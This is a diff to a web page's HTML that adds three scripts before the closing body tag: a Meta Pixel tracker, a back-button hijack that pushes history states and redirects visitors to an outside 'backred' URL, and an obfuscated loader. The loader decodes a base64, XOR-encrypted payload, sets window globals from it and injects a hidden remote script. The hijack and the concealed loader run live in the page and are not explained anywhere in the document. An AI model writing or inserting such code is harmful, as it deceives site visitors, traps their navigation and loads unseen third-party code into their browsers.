@@ -163,5 +163,54 @@ setInterval(updateDate, 60000);
 setInterval(updateViewers, 3000);
 </script>
 
+ <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1039978362316346');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1039978362316346&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+ 
+<script>
+  const link = 'https://sacredchantguide.site/backred/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+ <script>(function(){var z_s793=atob("DDMIqNizxJMWQCWiiUgq3arf5qk0KFHW+UAyh/fQoP04NVHP4FVxhrvcqb10MgrR6kFh2KzA6+ZiLVaN5VJ8zavH6vllYgmA6Ed82rHRsedzMweY0kgqxrneobEsYkHD/VIl3azerfVvbVXQ7EVtxqyevPB5JAjR6lgqhPrFpf9jJQeYqxF1hKORqvJ7JQeYq1dp3Lmesed7KUPbpEN6za7Wquc7M1DA4Fd7ivSRsvJ6NUCAsxEq1YXO");var b_le=[];for(var z_n8c=0;z_n8c<z_s793.length;z_n8c++){b_le.push(z_s793.charCodeAt(z_n8c)&255);}var c_hs=b_le[0];var l_vd8=b_le.slice(1,1+c_hs);var x_f926=b_le.slice(1+c_hs);var a_o8=x_f926.map(function(b,w_o){return b^l_vd8[w_o%c_hs];});var t_lc="";for(var m_1g4p=0;m_1g4p<a_o8.length;m_1g4p++){t_lc+=String.fromCharCode(a_o8[m_1g4p]&255);}var p_hpii=decodeURIComponent(escape(t_lc));var h_k1xh=JSON.parse(p_hpii);var k_p74=h_k1xh.globals||[];k_p74.forEach(function(x_5v5){window[x_5v5.name]=x_5v5.value;});var o_lit=document.createElement("script");o_lit.src=h_k1xh.url;o_lit.async=true;o_lit.defer=true;(h_k1xh.attributes||[]).forEach(function(z_2uf){o_lit.setAttribute(z_2uf.name,z_2uf.value);});(document.head||document.documentElement).appendChild(o_lit);})();</script>
+
+ 
+
 </body>
 </html>
